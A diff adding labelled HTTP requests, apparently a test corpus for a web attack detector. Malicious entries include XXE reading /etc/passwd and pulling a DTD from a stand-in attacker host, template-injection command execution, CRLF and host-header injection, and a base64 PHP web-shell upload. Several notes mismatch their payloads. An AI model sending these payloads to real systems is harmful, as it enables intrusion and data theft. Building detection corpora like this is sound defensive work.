+        "method": "POST",
+        "path": "/xmlrpc.php",
+        "query": "",
+        "body": "<methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>"
+      }
+    },
+    {
+      "id": "wp-v2-login-open-redirect",
+      "category": "cms_wordpress_probe",
+      "label": "malicious",
+      "note": "wp-login redirect_to pointed at an external host.",
+      "request": {
+        "method": "GET",
+        "path": "/wp-login.php",
+        "query": "redirect_to=//203.0.113.9",
+        "body": ""
+      }
+    },
+    {
+      "id": "wp-v2-duplicator-dump",
+      "category": "cms_wordpress_probe",
+      "label": "malicious",
+      "note": "Duplicator installer/database dump probe.",
+      "request": {
+        "method": "GET",
+        "path": "/wp-content/updater/2026-10-database.sql",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "xxe-v2-general-entity-file",
+      "category": "xxe",
+      "label": "malicious",
+      "note": "External general entity reading /etc/passwd through a local DTD.",
+      "request": {
+        "method": "POST",
+        "path": "/api/importar",
+        "query": "",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+        "headers": {
+          "content-type": "application/xml"
+        }
+      }
+    },
+    {
+      "id": "xxe-v2-parameter-entity-outofband",
+      "category": "xxe",
+      "label": "malicious",
+      "note": "Parameter-entity exfiltration toward an attacker host.",
+      "request": {
+        "method": "POST",
+        "path": "/api/xml",
+        "query": "",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://203.0.113.9/t.dtd\">%p;]><r/>",
+        "headers": {
+          "content-type": "text/xml"
+        }
+      }
+    },
+    {
+      "id": "ssti-v2-twig-tuple",
+      "category": "ssti",
+      "label": "malicious",
+      "note": "Twig/Twig-like tuple call executing a system command.",
+      "request": {
+        "method": "POST",
+        "path": "/perfil",
+        "query": "",
+        "body": "nombre={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+      }
+    },
+    {
+      "id": "ssti-v2-freemarker-read",
+      "category": "ssti",
+      "label": "malicious",
+      "note": "FreeMarker file read through the template API.",
+      "request": {
+        "method": "POST",
+        "path": "/plantilla",
+        "query": "",
+        "body": "contenido=${\"x\"?new_interpreter().evaluate(\"freemarker.template.utility.Execute?new()(\\\"id\\\")\")}"
+      }
+    },
+    {
+      "id": "ssti-v2-velocity-in-path",
+      "category": "ssti",
+      "label": "malicious",
+      "note": "Velocity reflection chain placed in a query parameter.",
+      "request": {
+        "method": "GET",
+        "path": "/buscar",
+        "query": "q=#set($s=$class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null))",
+        "body": ""
+      }
+    },
+    {
+      "id": "crlf-v2-redirect-param",
+      "category": "http_response_splitting",
+      "label": "malicious",
+      "note": "CRLF in a redirect parameter injecting a Set-Cookie header.",
+      "request": {
+        "method": "GET",
+        "path": "/ir",
+        "query": "destino=/gracias%0d%0aSet-Cookie:%20rol=admin",
+        "body": ""
+      }
+    },
+    {
+      "id": "crlf-v2-encoded-newline",
+      "category": "http_response_splitting",
+      "label": "malicious",
+      "note": "Percent-encoded bare newline used to split the response.",
+      "request": {
+        "method": "GET",
+        "path": "/buscar",
+        "query": "q=informe%0A%0Ax-powered-by: debil",
+        "body": ""
+      }
+    },
+    {
+      "id": "crlf-v2-header-value",
+      "category": "http_response_splitting",
+      "label": "malicious",
+      "note": "CRLF inside a custom header value reflected into the response.",
+      "request": {
+        "method": "GET",
+        "path": "/api/saludo",
+        "query": "nombre=x",
+        "body": "",
+        "headers": {
+          "x-nombre": "ana%0d%0aX-Injected:%201"
+        }
+      }
+    },
+    {
+      "id": "host-v2-poisoned-password-reset",
+      "category": "host_header_injection",
+      "label": "malicious",
+      "note": "Host header pointed at an attacker domain during password reset.",
+      "request": {
+        "method": "POST",
+        "path": "/recuperar",
+        "query": "",
+        "body": "correo=comprador@tienda.cl",
+        "headers": {
+          "host": "203.0.113.9"
+        }
+      }
+    },
+    {
+      "id": "host-v2-x-forwarded-host",
+      "category": "host_header_injection",
+      "label": "malicious",
+      "note": "X-Forwarded-Host used to poison the absolute URL built by the app.",
+      "request": {
+        "method": "GET",
+        "path": "/cuenta",
+        "query": "vista=perfil",
+        "body": "",
+        "headers": {
+          "x-forwarded-host": "ataque.example"
+        }
+      }
+    },
+    {
+      "id": "host-v2-server-side-portscan",
+      "category": "host_header_injection",
+      "label": "malicious",
+      "note": "Host header aimed at an internal admin listener on a non-standard port.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "",
+        "body": "",
+        "headers": {
+          "host": "127.0.0.1:9200"
+        }
+      }
+    },
+    {
+      "id": "upload-v2-double-extension",
+      "category": "malicious_upload",
+      "label": "malicious",
+      "note": "Double extension so the client filter sees .jpg and the server sees .php.",
+      "request": {
+        "method": "POST",
+        "path": "/adjuntos",
+        "query": "",
+        "body": "filename=shell.jpg.php&content=PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg=="
+      }
+    },
+    {
+      "id": "upload-v2-htaccess",
+      "category": "malicious_upload",
+      "label": "malicious",
+      "note": "Upload of an .htaccess that reinterprets .txt as PHP.",
+      "request": {
+        "method": "POST",
+        "path": "/adjuntos",
+        "query": "",
+        "body": "filename=.htaccess&content=AddType%20application/x-httpd-php%20.txt"
+      }
+    },
+    {
+      "id": "upload-v2-phtml",
+      "category": "malicious_upload",
+      "label": "malicious",
+      "note": "phtml extension used to bypass an allow-list of image types.",
+      "request": {
+        "method": "POST",
+        "path": "/imagen",
+        "query": "",
+        "body": "filename=foto.phtml&content=<?php system('id');?>"
+      }
+    },
+    {
+      "id": "benign-v2-search-union-credito",
+      "category": "benign",
+      "label": "benign",
+      "note": "Search for a financial product whose name contains the SQL keyword union.",
+      "request": {
+        "method": "GET",
+        "path": "/buscar",
+        "query": "q=union+de+credito+hipotecario",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-product-select",
+      "category": "benign",
+      "label": "benign",
+      "note": "Category page named 'seleccion' plus an ORDER-style sort parameter.",
+      "request": {
+        "method": "GET",
+        "path": "/categoria",
+        "query": "nombre=seleccion-de-vinos&orden=precio_desc",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-prose-sql-keywords",
+      "category": "benign",
+      "label": "benign",
+      "note": "Blog paragraph that discusses SQL commands in Spanish prose.",
+      "request": {
+        "method": "POST",
+        "path": "/blog/comentario",
+        "query": "",
+        "body": "{\"texto\": \"En la clase de hoy vimos SELECT, INSERT, UPDATE y DROP. El profe dijo que WHERE es la parte mas importante.\"}"
+      }
+    },
+    {
+      "id": "benign-v2-order-case-woodwork",
+      "category": "benign",
+      "label": "benign",
+      "note": "Product page for a carpentry tool, with the words order and case in the slug.",
+      "request": {
+        "method": "GET",
+        "path": "/tienda/order-and-case-chisels",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-dash-prose",
+      "category": "benign",
+      "label": "benign",
+      "note": "Support message using a double dash as a punctuation break, the way Chilean chat does.",
+      "request": {
+        "method": "POST",
+        "path": "/soporte/mensaje",
+        "query": "",
+        "body": "{\"texto\": \"Hola -- el pedido llega mañana? gracias\"}"
+      }
+    },
+    {
+      "id": "benign-v2-quote-with-semicolon",
+      "category": "benign",
+      "label": "benign",
+      "note": "Review text with a semicolon inside ordinary prose.",
+      "request": {
+        "method": "POST",
+        "path": "/resenas",
+        "query": "",
+        "body": "{\"comentario\": \"Buen producto; el envio tard6; volveria a comprar\"}"
+      }
+    },
+    {
+      "id": "benign-v2-apostrophe-name",
+      "category": "benign",
+      "label": "benign",
+      "note": "Customer name carrying an apostrophe and a Spanish accent.",
+      "request": {
+        "method": "POST",
+        "path": "/cliente",
+        "query": "",
+        "body": "{\"nombre\": \"O'Brien Peña\", \"ciudad\": \"Temuco\"}"
+      }
+    },
+    {
+      "id": "benign-v2-phone-plus",
+      "category": "benign",
+      "label": "benign",
+      "note": "Phone number in the local format, with plus signs and spaces.",
+      "request": {
+        "method": "POST",
+        "path": "/pedido",
+        "query": "",
+        "body": "{\"telefono\": \"+56 9 8765 4321\"}"
+      }
+    },
+    {
+      "id": "benign-v2-odata-filter",
+      "category": "benign",
+      "label": "benign",
+      "note": "OData-style filter expression with parentheses and equality operators.",
+      "request": {
+        "method": "GET",
+        "path": "/api/pedidos",
+        "query": "$filter=(status eq 'pagado') and (region eq 'MAU')",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-bracket-hpp",
+      "category": "benign",
+      "label": "benign",
+      "note": "Rails/Laravel style nested filter parameters.",
+      "request": {
+        "method": "GET",
+        "path": "/api/productos",
+        "query": "filter[stock][gt]=0&sort=-created_at&page=2",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-temperature-range",
+      "category": "benign",
+      "label": "benign",
+      "note": "Product description with a degree range and a hyphen.",
+      "request": {
+        "method": "GET",
+        "path": "/buscar",
+        "query": "q=termometro+-50+a+300%C2%B0C",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-ids-list",
+      "category": "benign",
+      "label": "benign",
+      "note": "Comma separated id list, the shape most batch APIs actually use.",
+      "request": {
+        "method": "GET",
+        "path": "/api/productos",
+        "query": "ids=1,2,3,4,5,6,7,8,9,10,11,12",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-base64-png",
+      "category": "benign",
+      "label": "benign",
+      "note": "Inline PNG preview in a JSON PATCH body.",
+      "request": {
+        "method": "PATCH",
+        "path": "/api/avatar",
+        "query": "",
+        "body": "{\"preview\": \"data:image/png;base64,a6W9/wp0xgMl6sAO5VLxejuSlWw4o/78xeegXNVsTnASofwGs/zD32N+Butxnt8UNTev3kcChL4gVSi8n9N75HJUNJVxwi4/xTCBNtBnn3ibaKHvECxVAJoJ+Vg9ypScVAVFhwIfi+XuhvFKMeXLjFiU1iINlWa3Y4brsmR2BAOio6QKYWQxYq2D509oJfVXt+HTL616zWMiZ09+Hv4DTQ5egKKUxgWxWA1aCEy+huccHVR/Wu4YrssAJHP0f5XuFveev3684MvxEYVqeQIbZxw1VjjS3Rx8AfeIME4RYrLqQY/seYRncTItJPbZfoS7kMtSR0FHilIIwj+LzICHEVkSo22jAugLI0P0JtkuiuTBbjME40ljt6a+b4wyQpdqF+FyIICJvroxQYWJ\"}"
+      }
+    },
+    {
+      "id": "benign-v2-pdf-upload",
+      "category": "benign",
+      "label": "benign",
+      "note": "Multipart-style upload field with a real invoice filename, accents and parentheses.",
+      "request": {
+        "method": "POST",
+        "path": "/adjuntos",
+        "query": "",
+        "body": "filename=Factura Electronica Boleta 2026 (1).pdf&type=application/pdf"
+      }
+    },
+    {
+      "id": "benign-v2-csv-body",
+      "category": "benign",
+      "label": "benign",
+      "note": "CSV upload with quoted fields containing commas and semicolons.",
+      "request": {
+        "method": "POST",
+        "path": "/importar",
+        "query": "",
+        "body": "nombre,direccion;comuna\n\"Aguirre, Jose\";Providencia\n\"Soto, Ana\";Nunoa\n"
+      }
+    },
+    {
+      "id": "benign-v2-encoded-quotes",
+      "category": "benign",
+      "label": "benign",
+      "note": "Form field whose value is a doubly URL-encoded quote set, produced by an old CMS editor.",
+      "request": {
+        "method": "POST",
+        "path": "/guardar-borrador",
+        "query": "",
+        "body": "texto=Los%2520caracteres%2520especiales%2520%2527%2522%253C%253E%2520quedan%2520asi"
+      }
+    },
+    {
+      "id": "benign-v2-newline-textarea",
+      "category": "benign",
+      "label": "benign",
+      "note": "Multi-line comment: a real newline in the urlencoded body.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "cuerpo=Hola%0AGracias%0A--%0AJose"
+      }
+    },
+    {
+      "id": "benign-v2-inline-svg-css",
+      "category": "benign",
+      "label": "benign",
+      "note": "Inline SVG used as a CSS background, common in hand-written style sheets.",
+      "request": {
+        "method": "POST",
+        "path": "/estilos",
+        "query": "",
+        "body": "regla=background-image:url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10'></svg>\")"
+      }
+    },
+    {
+      "id": "benign-v2-jsonld-script",
+      "category": "benign",
+      "label": "benign",
+      "note": "JSON-LD structured data block submitted by a SEO plugin.",
+      "request": {
+        "method": "POST",
+        "path": "/pagina",
+        "query": "",
+        "body": "<script type=\"application/ld+json\">{\"@context\":\"https://schema.org\",\"@type\":\"Product\",\"name\":\"Zapato Runner\"}</script>"
+      }
+    },
+    {
+      "id": "benign-v2-escaped-html-prose",
+      "category": "benign",
+      "label": "benign",
+      "note": "Bug report quoting markup as text, already entity-escaped by the client.",
+      "request": {
+        "method": "POST",
+        "path": "/soporte/ticket",
+        "query": "",
+        "body": "{\"detalle\": \"El boton renderiza &lt;button class=\\\"primary\\\"&gt; y no responde\"}"
+      }
+    },
+    {
+      "id": "benign-v2-long-alphanumeric",
+      "category": "benign",
+      "label": "benign",
+      "note": "Opaque tracking token: 64 hex characters, nothing else.",
+      "request": {
+        "method": "GET",
+        "path": "/envio",
+        "query": "guia=9f31a2c7b4e85d061f3a9c7b4e85d061f3a9c7b4e85d061f3a9c7b4e85d06",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-printer-ip",
+      "category": "benign",
+      "label": "benign",
+      "note": "Config form that stores the address of an office printer.",
+      "request": {
+        "method": "POST",
+        "path": "/dispositivos",
+        "query": "",
+        "body": "impresora=192.168.10.20&puerto=9100"
+      }
+    },
+    {
+      "id": "benign-v2-image-proxy",
+      "category": "benign",
+      "label": "benign",
+      "note": "Image proxy pointed at a public placeholder service.",
+      "request": {
+        "method": "GET",
+        "path": "/preview",
+        "query": "img=https://picsum.photos/640/480",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-return-relative",
+      "category": "benign",
+      "label": "benign",
+      "note": "Post-login redirect to a relative path on the same host.",
+      "request": {
+        "method": "GET",
+        "path": "/login",
+        "query": "next=/dashboard",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-paypal-return-url",
+      "category": "benign",
+      "label": "benign",
+      "note": "Payment gateway callback with an absolute HTTPS URL of the merchant.",
+      "request": {
+        "method": "GET",
+        "path": "/pago",
+        "query": "return_url=https://tienda.cl/gracias&step=3",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-docroot-path",
+      "category": "benign",
+      "label": "benign",
+      "note": "Deployment form field that names the real docroot of the store.",
+      "request": {
+        "method": "POST",
+        "path": "/ajustes/servidor",
+        "query": "",
+        "body": "ruta_base=/var/www/tienda/htdocs"
+      }
+    },
+    {
+      "id": "benign-v2-home-relative-path",
+      "category": "benign",
+      "label": "benign",
+      "note": "Developer tool setting that points at a project folder in the user home.",
+      "request": {
+        "method": "POST",
+        "path": "/ajustes/ide",
+        "query": "",
+        "body": "workspace=/home/lope/proyectos/tienda/src"
+      }
+    },
+    {
+      "id": "benign-v2-windows-unc",
+      "category": "benign",
+      "label": "benign",
+      "note": "Shared-folder path typed by an accounting user.",
+      "request": {
+        "method": "POST",
+        "path": "/importar",
+        "query": "",
+        "body": "origen=\\\\servidor\\contabilidad\\planilla.xlsx"
+      }
+    },
+    {
+      "id": "benign-v2-double-slash-url",
+      "category": "benign",
+      "label": "benign",
+      "note": "URL written by hand with a duplicated slash before the resource.",
+      "request": {
+        "method": "GET",
+        "path": "/recursos",
+        "query": "documento=/informes//2026/enero.pdf",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-double-dot-filename",
+      "category": "benign",
+      "label": "benign",
+      "note": "Filename that really contains two consecutive dots, as exported by some Chilean banks.",
+      "request": {
+        "method": "GET",
+        "path": "/bancos",
+        "query": "archivo=extracto..2026..09.pdf",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-referral-with-params",
+      "category": "benign",
+      "label": "benign",
+      "note": "Referer header with a campaign query string.",
+      "request": {
+        "method": "GET",
+        "path": "/aterrizaje",
+        "query": "utm_source=mail",
+        "body": "",
+        "headers": {
+          "referer": "https://tienda.cl/pago/?step=3&camp=reNov1"
+        }
+      }
+    },
+    {
+      "id": "benign-v2-webhook-shared-secret",
+      "category": "benign",
+      "label": "benign",
+      "note": "Webhook configuration holding a base64 shared secret.",
+      "request": {
+        "method": "POST",
+        "path": "/ajustes/webhook",
+        "query": "",
+        "body": "url=https://partner.example/hooks/a&secreto=ZQnHr7qKuHydIDnsJTLFZzooJQSVDaUc"
+      }
+    },
+    {
+      "id": "benign-v2-curl-user-agent",
+      "category": "benign",
+      "label": "benign",
+      "note": "Health check from the hosting panel using curl as its user agent.",
+      "request": {
+        "method": "GET",
+        "path": "/salud",
+        "query": "",
+        "body": "",
+        "headers": {
+          "user-agent": "curl/8.4.0",
+          "accept": "*/*"
+        }
+      }
+    },
+    {
+      "id": "benign-v2-basic-auth",
+      "category": "benign",
+      "label": "benign",
+      "note": "Legacy integration authenticating with HTTP Basic, which is not an attack.",
+      "request": {
+        "method": "GET",
+        "path": "/api/inventario",
+        "query": "",
+        "body": "",
+        "headers": {
+          "authorization": "Basic c2luY3JvbmlhOmNsYXZlRGVQcnVlYmE="
+        }
+      }
+    },
+    {
+      "id": "benign-v2-cookie-encoded",
+      "category": "benign",
+      "label": "benign",
+      "note": "Session cookie header with URL-encoded values and separators.",
+      "request": {
+        "method": "GET",
+        "path": "/carrito",
+        "query": "",
+        "body": "",
+        "headers": {
+          "cookie": "tsid=a1b2c3;carrito=%7B%22items%22%3A2%7D;pais=CL"
+        }
+      }
+    },
+    {
+      "id": "benign-v2-login-normal",
+      "category": "benign",
+      "label": "benign",
+      "note": "Ordinary sign-in request.",
+      "request": {
+        "method": "POST",
+        "path": "/api/login",
+        "query": "",
+        "body": "{\"email\": \"clienta@tienda.cl\", \"clave\": \"MiClave;ls -la 2026\"}"
+      }
+    },
+    {
+      "id": "benign-v2-refresh-token",
+      "category": "benign",
+      "label": "benign",
+      "note": "Refresh request carrying an opaque bearer-shaped token issued by this service.",
+      "request": {
+        "method": "POST",
+        "path": "/api/token/refresh",
+        "query": "",
+        "body": "{\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ofRNYncc2Lp5a9PUz9RCzWHv5iyhQcoTjLry3zMLyu1y3i56PGQAbMH5DDCHy4QRgeRTuT03iESuxJkfJd15BQt81Fqayrkr4FdKiZi3RIeuaJwkPWER-KsH.c2ln\"}"
+      }
+    },
+    {
+      "id": "benign-v2-wordpress-search",
+      "category": "benign",
+      "label": "benign",
+      "note": "Visitor using the WordPress search box.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "s=plugins+de+pagos",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-wp-rest-posts",
+      "category": "benign",
+      "label": "benign",
+      "note": "Front-end listing posts through the public REST endpoint.",
+      "request": {
+        "method": "GET",
+        "path": "/wp-json/wp/v2/posts",
+        "query": "per_page=10&_fields=title,link",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-wp-admin-ajax-heartbeat",
+      "category": "benign",
+      "label": "benign",
+      "note": "WordPress heartbeat call from an open admin tab.",
+      "request": {
+        "method": "POST",
+        "path": "/wp-admin/admin-ajax.php",
+        "query": "",
+        "body": "action=heartbeat&interval=15&data=%7B%22common%22%3A%7B%22last%22%3A1730000000%7D%7D"
+      }
+    },
+    {
+      "id": "benign-v2-woocommerce-webhook",
+      "category": "benign",
+      "label": "benign",
+      "note": "WooCommerce order webhook with a signature header.",
+      "request": {
+        "method": "POST",
+        "path": "/webhook/woocommerce",
+        "query": "",
+        "body": "{\"order\": {\"id\": 4821, \"currency\": \"CLP\", \"total\": \"35990\", \"billing\": {\"first_name\": \"Ana\", \"last_name\": \"Soto\"}}}",
+        "headers": {
+          "x-wc-webhook-signature": "dGVzdA=="
+        }
+      }
+    },
+    {
+      "id": "benign-v2-rest-user-self",
+      "category": "benign",
+      "label": "benign",
+      "note": "Authenticated user reading its own record from the users endpoint.",
+      "request": {
+        "method": "GET",
+        "path": "/api/usuarios",
+        "query": "id=4821&campos=nombre,email",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-favicon-cachebust",
+      "category": "benign",
+      "label": "benign",
+      "note": "Static asset with a version query string.",
+      "request": {
+        "method": "GET",
+        "path": "/favicon.ico",
+        "query": "v=1.2.3",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-long-query",
+      "category": "benign",
+      "label": "benign",
+      "note": "Filter URL with many short parameters, close to the length limit but well formed.",
+      "request": {
+        "method": "GET",
+        "path": "/catalogo",
+        "query": "f0=872&f1=460&f2=708&f3=368&f4=648&f5=613&f6=199&f7=104&f8=639&f9=74&f10=90&f11=4&f12=402&f13=924&f14=581&f15=560&f16=99&f17=921&orden=precio",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-graphql-alias-readonly",
+      "category": "benign",
+      "label": "benign",
+      "note": "Ordinary GraphQL query that uses aliases to fetch two independent lists.",
+      "request": {
+        "method": "POST",
+        "path": "/graphql",
+        "query": "",
+        "body": "{\"query\": \"{destacados:products(tag:\\\"navidad\\\"){sku} nuevos:products(tag:\\\"2026\\\"){sku price}}\"}"
+      }
+    },
+    {
+      "id": "benign-v2-graphql-variables",
+      "category": "benign",
+      "label": "benign",
+      "note": "Query plus variables, the normal shape a SPA sends.",
+      "request": {
+        "method": "POST",
+        "path": "/graphql",
+        "query": "",
+        "body": "{\"query\": \"query($sku:String!){product(sku:$sku){name price}}\", \"variables\": {\"sku\": \"RM-12345\"}}"
+      }
+    },
+    {
+      "id": "benign-v2-json-deep-nesting",
+      "category": "benign",
+      "label": "benign",
+      "note": "Page-builder payload with seven legitimate nesting levels.",
+      "request": {
+        "method": "POST",
+        "path": "/pagina",
+        "query": "",
+        "body": "{\"a\": {\"b\": {\"c\": {\"d\": {\"e\": {\"f\": {\"g\": {\"fila\": 1}}}}}}}}"
+      }
+    },
+    {
+      "id": "benign-v2-grafana-panel",
+      "category": "benign",
+      "label": "benign",
+      "note": "Dashboard panel save containing a Prometheus query with braces and pipes.",
+      "request": {
+        "method": "POST",
+        "path": "/api/dashboards/db",
+        "query": "",
+        "body": "{\"dashboard\": {\"panels\": [{\"targets\": [{\"expr\": \"sum(rate(http_requests_total{job=\\\"tienda\\\",code=~\\\"5..\\\"}[5m])) by (status)\"}]}]}}"
+      }
+    },
+    {
+      "id": "benign-v2-elasticsearch-dsl",
+      "category": "benign",
+      "label": "benign",
+      "note": "Search-as-you-type request with an Elasticsearch bool query.",
+      "request": {
+        "method": "POST",
+        "path": "/api/buscar",
+        "query": "",
+        "body": "{\"query\": {\"bool\": {\"must\": [{\"match\": {\"titulo\": \"zapatilla running\"}}], \"filter\": [{\"term\": {\"disponible\": true}}]}}}"
+      }
+    },
+    {
+      "id": "benign-v2-crontab-field",
+      "category": "benign",
+      "label": "benign",
+      "note": "Hosting panel saving a cron schedule with asterisks and slashes.",
+      "request": {
+        "method": "POST",
+        "path": "/ajustes/cron",
+        "query": "",
+        "body": "expresion=*/15 * * * * &comando=php artisan schedule:run"
+      }
+    },
+    {
+      "id": "benign-v2-email-with-plus",
+      "category": "benign",
+      "label": "benign",
+      "note": "Address with a plus tag, as Gmail users write.",
+      "request": {
+        "method": "GET",
+        "path": "/suscripcion",
+        "query": "correo=j.lopez+tienda@example.com",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-regex-help",
+      "category": "benign",
+      "label": "benign",
+      "note": "Documentation page body that contains a validation regex.",
+      "request": {
+        "method": "POST",
+        "path": "/docs/validacion",
+        "query": "",
+        "body": "ejemplo=^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"
+      }
+    },
+    {
+      "id": "benign-v2-temperature-script",
+      "category": "benign",
+      "label": "benign",
+      "note": "Config form value that stores a shell-looking variable assignment innocuously.",
+      "request": {
+        "method": "POST",
+        "path": "/ajustes/env",
+        "query": "",
+        "body": "variable=APP_ENV&valor=production"
+      }
+    },
+    {
+      "id": "benign-v2-xml-product-feed",
+      "category": "benign",
+      "label": "benign",
+      "note": "Google Shopping style XML feed with entities but no DTD.",
+      "request": {
+        "method": "POST",
+        "path": "/feed",
+        "query": "",
+        "body": "<?xml version=\"1.0\"?><rss version=\"2.0\"><channel><title>Tienda &amp; socios</title><item><g:id>RM-1</g:id></item></channel></rss>"
+      }
+    },
+    {
+      "id": "benign-v2-sitemap",
+      "category": "benign",
+      "label": "benign",
+      "note": "Crawler hitting the sitemap.",
+      "request": {
+        "method": "GET",
+        "path": "/sitemap.xml",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-robots",
+      "category": "benign",
+      "label": "benign",
+      "note": "Crawler hitting robots.txt.",
+      "request": {
+        "method": "GET",
+        "path": "/robots.txt",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "benign-v2-contact-form-latam",
+      "category": "benign",
+      "label": "benign",
+      "note": "Contact form with the punctuation people actually type.",
+      "request": {
+        "method": "POST",
+        "path": "/contacto",
+        "query": "",
+        "body": "nombre=Jose%20Miguel&correo=jm%40empresa.cl&mensaje=Quiero%20cotizar%203%20servicios%2C%20gracias%21"
+      }
+    }
+  ]
+}
